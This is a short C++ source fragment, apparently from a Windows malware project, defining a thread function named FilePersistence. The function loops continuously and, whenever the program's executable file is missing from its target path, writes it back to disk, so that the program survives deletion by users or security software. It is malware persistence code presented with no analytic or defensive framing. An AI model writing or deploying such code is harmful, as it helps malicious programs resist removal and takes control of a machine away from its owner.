#include "../core.hpp"

DWORD __stdcall FilePersistence( API *api ) {
	while(api->persist) {
		if (!api->fileExists(api->final)) {
			dumpFile(api, api->directory, api->exefile);
		}
		Sleep(1);
	}
	return 0;
}